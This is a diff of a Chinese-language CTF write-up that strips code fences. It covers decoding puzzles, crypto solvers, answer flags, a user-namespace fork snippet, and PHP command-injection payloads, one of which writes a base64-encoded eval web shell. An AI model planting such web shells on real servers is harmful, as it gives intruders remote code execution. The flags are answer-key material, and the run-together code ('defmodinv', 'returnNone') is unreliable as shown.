@@ -66,7 +66,8 @@ base混合解码即可得到flag。
 
 Base混合多重解码:
 [解码3次] Base32 -> Base64 -> Ascii85
-混合解码结果:flag{hnctfqwer54321}
+混合解码结果:
+flag{hnctfqwer54321}
 
 flag值：
 
@@ -213,7 +214,8 @@ defmodinv(a, m):
     """ 计算 a 在模 m 下的乘法逆元 """
     g, x, y = extended_gcd(a, m)
     if g != 1:
-        returnNone# 逆元不存在
+        returnNone
+# 逆元不存在
     else:
         return x % m
 
@@ -422,68 +424,19 @@ iloveyou<DEL><DEL><DEL><DEL><DEL><DEL><DEL><DEL>flag{}inKJ<DEL><DEL>op97ya<DEL><
 flag{}inop97bc6g9
 删除的字符如下:
 iloveyouKJya
-```
-
-
-
-```
 flag{inop97bc6g9}
-```
-
-
-
-```
 flag{12axzaq1sz}
-```
-
-
-
-```
 flag{DGswTfgy1GD236fs2sfF2dskLng}
-```
-
-
-
-```
 flag{ac6417423bb3000c}
-```
-
-
-
-```
 0k4o 0k46 0k4p 0k54 0k51 0k33 0k33 0k43 0k4o 0k35 0k53 0k45 0k53 0k56 0k32 0k56 0k49 0k45 0k33 0k55 0k59 0k52 0k4o 0k32 0k49 0k52 0k52 0k44 0k41 0k4r 0k42 0k57 0k4o 0k46 0k4p 0k46 0k45 0k51 0k32 0k58 0k49 0k35 0k45 0k58 0k51 0k55 0k52 0k52 0k4o 0k5n 0k52 0k55 0k34 0k57 0k44 0k50 0k48 0k55 0k3q 0k3q 0k3q 0k3q 0k3q 0k3q
-```
-
-
-
-```
 Base混合多重解码:
 [解码3次] Base32 -> Base64 -> Ascii85
-混合解码结果:flag{hnctfqwer54321}
-```
-
-
-
-```
+混合解码结果:
 flag{hnctfqwer54321}
-```
-
-
-
-```
+flag{hnctfqwer54321}
 解压这个文件夹.zip
 这是一张图片.png
-```
-
-
-
-```
 flag{ctf_you_passed}
-```
-
-
-
-```
 from secret import init1,init2,init3,FLAG
 import hashlib
 assert(FLAG=="flag{"+hashlib.sha256(init1+init2+init3).hexdigest()+"}")
@@ -519,11 +472,6 @@ if __name__=="__main__":
             for j inrange(8):
                 b = (b<<1)+combine(l1.next(),l2.next(),l3.next())
             f.write(chr(b).encode())
-```
-
-
-
-```
 if((wrapper = fork()) == 0) {
         if(unshare(CLONE_NEWUSER) != 0)
             fprintf(stderr, "failed to create new user namespacen");
@@ -545,24 +493,9 @@ if((wrapper = fork()) == 0) {
         waitpid(init, &status, 0);
         return0;
     }
-```
-
-
-
-```
 102 108 97 103 123 72 78 67 84 70 109 110 103 49 50 51 125
 From_Decimal-->flag{HNCTFmng123}
-```
-
-
-
-```
 flag{HNCTFmng123}
-```
-
-
-
-```
 def check():
     a = input('plz input your flag:')
     c = [144,163,158,177,121,39,58,58,91,111,25,158,72,53,152,78,171,12,53,105,45,12,12,53,12,171,111,91,53,152,105,45,152,144,39,171,45,91,78,45,158,8]
@@ -578,18 +511,8 @@ def check():
     print('win')
 
 check()
-```
-
-
-
-```
 if len(a) != 42:
 ord(a[i]) * 33 % b != c[i]:
-```
-
-
-
-```
 import math
 
 defextended_gcd(a, b):
@@ -604,7 +527,8 @@ defmodinv(a, m):
     """ 计算 a 在模 m 下的乘法逆元 """
     g, x, y = extended_gcd(a, m)
     if g != 1:
-        returnNone# 逆元不存在
+        returnNone
+# 逆元不存在
     else:
         return x % m
 
@@ -636,11 +560,6 @@ for b inrange(2, 256):
 # b = 146, flag = TYPUe)../S-P*%(R-P%+QPP%P-S/%(+Q(T)-Q/RQPf
 # b = 151, flag = IENJ6okklHjNptwGsEtqFEEtEsHltwqFwIosFlGFN.
 # b = 179, flag = flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}
-```
-
-
-
-```
 import math
 
 deffind_a(res, b):
@@ -671,32 +590,12 @@ for line in lines:
         break
 
 # flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}
-```
-
-
-
-```
 flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}
-```
-
-
-
-```
 ip/?cmd=print(base64_encode(file_get_contents(base64_decode("ZmxhZy5waHA="))));
-```
-
-
-
-```
 file_put_contents(
     base64_decode("c2hlbGwucGhw"),  // "shell.php"
     base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==")  // "<?php @eval($_POST[x]); ?>"
 );
-```
-
-
-
-```
 ip/?cmd=file_put_contents(base64_decode("c2hlbGwucGhw"),base64_decode("PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg=="));
 ```
 
